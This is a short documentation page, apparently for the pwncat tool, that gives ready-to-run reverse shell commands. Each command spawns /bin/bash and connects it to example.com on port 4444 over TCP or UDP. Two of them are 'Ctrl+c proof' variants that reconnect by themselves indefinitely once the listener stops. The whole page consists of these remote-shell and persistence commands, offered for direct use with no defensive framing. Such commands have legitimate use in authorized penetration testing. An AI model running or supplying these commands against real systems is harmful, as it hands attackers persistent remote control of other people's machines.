*************
Reverse Shell
*************


.. note::

   :ref:`what_is_a_reverse_shell`


TCP Reverse shell
=================

Default TCP reverse shell connecting to ``example.com:4444`` which behaves exactly as ``nc``.

.. code-block:: bash

   pwncat -e '/bin/bash' example.com 4444


The following is a Ctrl+c proof TCP reverse shell. If you stop your local listener, the reverse shell will automatically connect back to you indefinitely.

.. code-block:: bash

   pwncat -e '/bin/bash' example.com 4444 --reconn --recon-wait 1


UDP Reverse shell
=================

Default UDP reverse shell which behaves exactly as ``nc``.

.. code-block:: bash

   pwncat -e '/bin/bash' example.com 4444 -u


The following is a Ctrl+c proof UDP reverse shell. If you stop your local listener, the reverse shell will automatically connect back to you indefinitely.

.. code-block:: bash

   pwncat -e '/bin/bash' example.com 4444 -u --ping-intvl 1
